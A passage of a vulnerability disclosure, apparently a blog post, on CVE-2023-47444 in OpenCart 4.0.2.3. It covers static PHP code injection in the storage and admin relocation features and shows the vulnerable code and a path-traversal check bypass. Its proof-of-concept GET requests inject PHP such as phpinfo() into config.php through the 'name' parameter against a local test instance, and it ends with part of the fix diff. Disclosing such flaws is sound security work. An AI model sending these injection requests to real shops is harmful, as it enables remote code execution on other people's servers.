<span class="k">print</span><span class="p">(</span><span class="nv">$root</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// /home/kali/Projects/OpenCart/4.0.2.3/</span>

<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/new-folder'</span><span class="p">;</span>  <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/new-folder'</span><span class="p">;</span>  <span class="c1">// result -&gt; Accepted!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/../../../../../../../../dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Accepted!</span>

<span class="k">if</span> <span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$root</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$root</span> <span class="o">==</span> <span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Error!"</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Accepted!"</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div> <p>The OpenCart installation directory can be retrieved in many different ways. It can be leaked through the GUI (if the <code class="language-plaintext highlighter-rouge">storage</code> folder has never been moved), or through verbose errors (eg. CVE-2011-3763 <sup id="fnref:3763" role="doc-noteref"><a href="#fn:3763" class="footnote" rel="footnote">2</a></sup>). It can also be read from logs if the user has the <code class="language-plaintext highlighter-rouge">tool/log</code> read privilege, or it can be discovered mis-using other funtionalities such as the change profile image <sup id="fnref:1891" role="doc-noteref"><a href="#fn:1891" class="footnote" rel="footnote">3</a></sup>.</p> <p class="text-center"><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/path-disclosure.png" alt="path-disclosure" /></p> <p>At <code class="language-plaintext highlighter-rouge">[4]</code>, the application checks that <code class="language-plaintext highlighter-rouge">$base_new</code> does not already exist and <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> have writable privileges. If no error has occurred, the application creates the new folder <code class="language-plaintext highlighter-rouge">[5]</code> and moves all the files from the old <code class="language-plaintext highlighter-rouge">storage</code> path to the newer one.<br /> Finally, at <code class="language-plaintext highlighter-rouge">[6]</code>, it replaces inside <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> the old <code class="language-plaintext highlighter-rouge">DIR_STORAGE</code> value with the newer one, without performing any further checks on the variable.</p> <p>In a normal scenario, the storage directory will be moved to a newer location under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject a new storage path inside configuration files containing special characters that allow escaping the <code class="language-plaintext highlighter-rouge">define()</code> function and add arbitrary PHP code.</p> <p><em>4.0.2.3/upload/admin/config.php</em></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Default DIR_STORAGE value</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="no">DIR_SYSTEM</span> <span class="mf">.</span> <span class="s1">'storage/'</span><span class="p">);</span>

<span class="c1">// DIR_STORAGE after a legitimate move</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/'</span><span class="p">);</span>

<span class="c1">// DIR_STORAGE after the exploitation</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/'</span><span class="p">);</span><span class="nb">phpinfo</span><span class="p">();</span><span class="c1">#');</span>
</code></pre></div></div> <h3 id="static-code-injection-in-commonsecurityadmin"> <a href="#static-code-injection-in-commonsecurityadmin" class="anchor-heading" aria-labelledby="static-code-injection-in-commonsecurityadmin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Static Code Injection in common/security.admin </h3> <blockquote class="bug"> <p>The <code class="language-plaintext highlighter-rouge">admin()</code> function in <code class="language-plaintext highlighter-rouge">upload/admin/controller/common/security.php</code> is vulnerable to PHP static code injection because <code class="language-plaintext highlighter-rouge">$name</code> user-controlled variable is placed inside <code class="language-plaintext highlighter-rouge">$base_new</code>, which is then written inside a new <code class="language-plaintext highlighter-rouge">config.php</code> file, without proper escape or validation.</p> </blockquote> <p>The relevant vulnerable code can be found below:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">admin</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// [1]</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
            <span class="s1">'[^a-zA-z0-9]'</span><span class="p">,</span> 
            <span class="s1">''</span><span class="p">,</span> 
            <span class="nb">basename</span><span class="p">(</span>
                <span class="nb">html_entity_decode</span><span class="p">(</span>
                    <span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> 
                    <span class="no">ENT_QUOTES</span><span class="p">,</span> 
                    <span class="s1">'UTF-8'</span>
                <span class="p">)</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">hasPermission</span><span class="p">(</span><span class="s1">'modify'</span><span class="p">,</span> <span class="s1">'common/security'</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$base_old</span> <span class="o">=</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s1">'admin/'</span><span class="p">;</span> 
        <span class="nv">$base_new</span> <span class="o">=</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_old</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [2]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin_exists'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin_name'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_writable'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_permission'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$json</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="c1">// 1.  We need to copy the files, as rename cannot be used on any directory, </span>
        <span class="c1">//     the executing script is running under</span>
        <span class="c1">// ...</span>
        <span class="c1">// 2. Create the new admin folder name</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [3]</span>
            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// 3. split the file copies into chunks.</span>
        <span class="c1">// ...</span>
        <span class="c1">// 4. Copy the files across</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nv">$start</span><span class="p">,</span> <span class="nv">$end</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="nv">$page</span> <span class="o">*</span> <span class="nv">$limit</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'next'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">url</span><span class="o">-&gt;</span><span class="nb">link</span><span class="p">(</span>
                <span class="s1">'common/security.admin'</span><span class="p">,</span>
                <span class="s1">'&amp;user_token='</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">'user_token'</span><span class="p">]</span> <span class="mf">.</span> 
                <span class="s1">'&amp;name='</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> 
                <span class="s1">'&amp;page='</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
                <span class="kc">true</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Update the old config files</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$base_new</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">;</span>
            <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>

            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$lines</span> <span class="k">as</span> <span class="nv">$line_id</span> <span class="o">=&gt;</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$status</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

                <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'HTTP_SERVER'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'HTTP_SERVER\', \''</span> <span class="mf">.</span> <span class="c1">// [4]</span>
                    <span class="nb">substr</span><span class="p">(</span> 
                        <span class="no">HTTP_SERVER</span><span class="p">,</span> 
                        <span class="mi">0</span><span class="p">,</span> 
                        <span class="nb">strrpos</span><span class="p">(</span><span class="no">HTTP_SERVER</span><span class="p">,</span> <span class="s1">'/admin/'</span><span class="p">)</span>
                        <span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s1">'/\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> 
                    <span class="nv">$status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'DIR_APPLICATION'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'DIR_APPLICATION\', DIR_OPENCART . \''</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="c1">// [5]</span>
                    <span class="s1">'/\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> 
                    <span class="nv">$status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div></div> <p>At <code class="language-plaintext highlighter-rouge">[1]</code> the new admin directory name is read from the incoming HTTP GET request and stored inside the <code class="language-plaintext highlighter-rouge">$name</code> PHP variable. Also in this case, a regex is applied in order to remove special untrusted characters, but it is badly implemented and so does nothing. As for the <code class="language-plaintext highlighter-rouge">storage()</code> function, also in this case <code class="language-plaintext highlighter-rouge">basename()</code> <sup id="fnref:basename:1" role="doc-noteref"><a href="#fn:basename" class="footnote" rel="footnote">1</a></sup> is used on the supplied <code class="language-plaintext highlighter-rouge">name</code> parameter, preventing us from using the <code class="language-plaintext highlighter-rouge">/</code> character inside it. <br /></p> <p>At <code class="language-plaintext highlighter-rouge">[2]</code>, after having verified the authenticated user has the write privilege for <code class="language-plaintext highlighter-rouge">common/security</code>, the application checks if the <code class="language-plaintext highlighter-rouge">admin/</code> or the new folder exists and also that <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> have writable privileges. If no error has occurrs, the application creates the new folder <code class="language-plaintext highlighter-rouge">[3]</code> and moves all the files from the old admin path to the newer one.</p> <p>Finally, at <code class="language-plaintext highlighter-rouge">[4]</code> and <code class="language-plaintext highlighter-rouge">[5]</code>, it replaces inside the new <code class="language-plaintext highlighter-rouge">config.php</code> the old <code class="language-plaintext highlighter-rouge">HTTP_SERVER</code> and <code class="language-plaintext highlighter-rouge">DIR_APPLICATION</code> variables with the new path, without performing any further checks on the variables.</p> <p>In a normal scenario, the <code class="language-plaintext highlighter-rouge">admin/</code> directory will be moved to a newer directory under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject two new <code class="language-plaintext highlighter-rouge">HTTP_SERVER</code> and <code class="language-plaintext highlighter-rouge">DIR_APPLICATION</code> paths inside the configuration file containing special characters that allow escaping the <code class="language-plaintext highlighter-rouge">define()</code> function and add arbitrary PHP code.</p> <h2 id="exploit-conditions-and-prerequisites"> <a href="#exploit-conditions-and-prerequisites" class="anchor-heading" aria-labelledby="exploit-conditions-and-prerequisites"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploit Conditions and Prerequisites </h2> <p>Both the vulnerabilities can be exploited if the attacker has valid credentials for the backend dashboard with the <code class="language-plaintext highlighter-rouge">write</code> permission on <code class="language-plaintext highlighter-rouge">common/security</code>. Furthermore, an additional pre-requisite is needed to exploit the <code class="language-plaintext highlighter-rouge">admin()</code> function (<code class="language-plaintext highlighter-rouge">common/security.admin</code>), whereby the <code class="language-plaintext highlighter-rouge">admin/</code> folder must be the default one and must not have been previously renamed.</p> <h2 id="proof-of-concept"> <a href="#proof-of-concept" class="anchor-heading" aria-labelledby="proof-of-concept"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Proof-of-Concept </h2> <h3 id="poc-for-commonsecuritystorage"> <a href="#poc-for-commonsecuritystorage" class="anchor-heading" aria-labelledby="poc-for-commonsecuritystorage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PoC for common/security.storage </h3> <p>The vulnerability in <code class="language-plaintext highlighter-rouge">common/security.storage</code> can be exploited by sending two GET requests.</p> <blockquote class="danger"> <p>The PoC do not fix the mismatch between the <code class="language-plaintext highlighter-rouge">DIR_STORAGE</code> variable written inside <code class="language-plaintext highlighter-rouge">config.php</code> and the actual folder created on disk (<code class="language-plaintext highlighter-rouge">/home/kali/Projects/OpenCart/4.0.2.3/pwned'\'');phpinfo();#</code>). This means that <strong>the PoC completely breaks the application</strong>. Be aware of this.</p> </blockquote> <p>The first request has to be sent to: <code class="language-plaintext highlighter-rouge">route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;</code></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin_secret\/index.php?route=common\/security.storage&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;name=pwned');phpinfo();#&amp;path=\/home\/kali\/Projects\/OpenCart\/4.0.2.3\/&amp;page=2"}
</code></pre></div></div> <p>The second one to: <code class="language-plaintext highlighter-rouge">route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;&amp;page=99</code></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;page=99</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"success":"Success: Storage directory has been moved!"}
</code></pre></div></div> <p>Now every page will include the poisoned <code class="language-plaintext highlighter-rouge">config.php</code> file, executing the injected code (in our case the <code class="language-plaintext highlighter-rouge">phpinfo()</code> function):</p> <p class="text-center"><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/storage-rce.png" alt="storage-rce" /></p> <p><strong>Demo</strong>:</p> <iframe width="560" height="315" src="https://www.youtube.com/embed/auTky_gm8Rk?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe> <h3 id="poc-for-commonsecurityadmin"> <a href="#poc-for-commonsecurityadmin" class="anchor-heading" aria-labelledby="poc-for-commonsecurityadmin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PoC for common/security.admin </h3> <p>The vulnerability in <code class="language-plaintext highlighter-rouge">common/security.admin</code> can also be exploited by sending two different GET requests.</p> <p>The first one to: <code class="language-plaintext highlighter-rouge">route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=1&amp;name=foo%27);phpinfo();print(%27</code></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=1&amp;name=foo%27);phpinfo();print(%27</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin\/index.php?route=common\/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;name=foo');phpinfo();print('&amp;page=2"}
</code></pre></div></div> <p>The second one to: <code class="language-plaintext highlighter-rouge">route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=99&amp;name=foo%27);phpinfo();print(%27</code></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=99&amp;name=foo%27);phpinfo();print(%27</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"redirect":"http:\/\/127.0.0.1:8888\/foo');phpinfo();print('\/index.php?route=common\/login"}

</code></pre></div></div> <p>In this case, a new directory containing the poinsoned <code class="language-plaintext highlighter-rouge">config.php</code> file will be created:</p> <p class="text-center"><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/admin-rce.png" alt="admin-rce" /></p> <p><strong>Demo</strong>:</p> <iframe width="560" height="315" src="https://www.youtube.com/embed/6if6Kfsb2oM?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe> <h2 id="mitigations-and-hotfix"> <a href="#mitigations-and-hotfix" class="anchor-heading" aria-labelledby="mitigations-and-hotfix"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Mitigations and hotfix </h2> <p>Fixing the misconfigured regexes (pull reqeust <a href="https://github.com/opencart/opencart/pull/12949">#12949</a>) should prevent the exploitation in both the scenarios:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="o">+</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9_]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9_\:\/]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
<span class="o">+</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9_\:\/]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">@@</span> <span class="o">-</span><span class="mi">282</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">282</span><span class="p">,</span><span class="mi">7</span> <span class="o">@@</span> <span class="k">public</span> <span class="k">function</span> <span class="n">admin</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
